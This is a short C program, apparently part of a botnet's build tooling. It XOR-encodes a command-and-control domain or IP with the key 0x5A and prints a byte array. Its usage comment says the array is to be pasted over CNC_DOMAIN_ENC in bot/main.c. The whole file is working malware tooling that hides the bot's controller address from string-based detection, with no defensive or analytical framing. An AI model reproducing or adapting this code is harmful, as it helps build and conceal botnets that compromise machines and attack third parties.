#include <stdio.h>
#include <string.h>

/* usage: ./cipher "domain_or_ip"
   prints the XOR(0x5A) byte array to paste over CNC_DOMAIN_ENC in bot/main.c */
int main(int argc, char **argv) {
    if (argc != 2 || !argv[1][0] || strlen(argv[1]) > 63) {
        fprintf(stderr, "usage: %s \"domain_or_ip\"\n", argv[0]);
        return 1;
    }
    const char *s = argv[1];
    size_t n = strlen(s);
    printf("static const uint8_t CNC_DOMAIN_ENC[] = {\n    ");
    for (size_t i = 0; i < n; i++) {
        printf("0x%02x%s", ((unsigned char)s[i]) ^ 0x5a, (i + 1 < n) ? ", " : "");
        if ((i + 1) % 8 == 0 && i + 1 < n) printf("\n    ");
    }
    printf(", 0x00\n};\n");
    return 0;
}
